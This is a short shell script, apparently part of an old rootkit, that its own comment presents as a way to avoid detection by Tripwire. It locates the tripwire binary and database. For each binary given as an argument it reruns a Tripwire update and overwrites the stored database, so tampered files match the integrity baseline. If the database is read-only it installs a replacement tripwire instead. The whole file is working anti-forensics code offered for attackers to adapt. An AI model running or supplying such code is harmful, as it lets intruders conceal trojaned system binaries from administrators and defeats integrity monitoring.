#!/bin/sh
# Simple script to avoid detection by tripwire. Modify to suit your needs.

echo -n "Trying to guess the location of tripwire. . ."

TRIPWIRE=`which tripwire`

if [ ! -x $TRIPWIRE ]; then
	echo "Failed!"
	echo -n "Please enter a full path to tripwire: "

	while read TRIPWIRE; do
		if [ -x $TRIPWIRE ]; then
			echo "Ok."
			break
		else
			echo -n "That doesn't exist! Try again: "
		fi
	done
else
	echo "Ok: $TRIPWIRE"
fi

echo -n "Trying to guess the location of the tripwire database. . ."

DBPATH="/usr/adm/tcheck/databases/tw.db"

if [ ! -f $DBPATH ]; then
	echo "Failed!"
	echo -n "Please enter the name of the database file: "

	while read DBPATH; do
		if [ -f $DBPATH ]; then
			echo "Ok."
			break
		else
			echo -n "That doesn't exist! Try again: "
		fi
	done
else
	echo "Ok: $DBPATH"
fi

DONE=false
while [ $DONE = "false" ]; do
	DONE=true
	echo -n "Is the database file read-only?[y(n)] "
	read ANSWER
	case $ANSWER in
		[yY] )
			make tripwire-inst
			install.sh $TRIPWIRE
			exit 0 ;;
		[nN] )
			break ;;
		* )
			echo "Yes or No"\!
			DONE=false ;;
	esac
done

DBFILE=./databases/`basename $DBPATH`

for BIN; do
	echo -n "Updating $BIN. . ."
	$TRIPWIRE -update $BIN
	mv $DBFILE $DBPATH
	echo "done."
done

echo "All done here chief!"
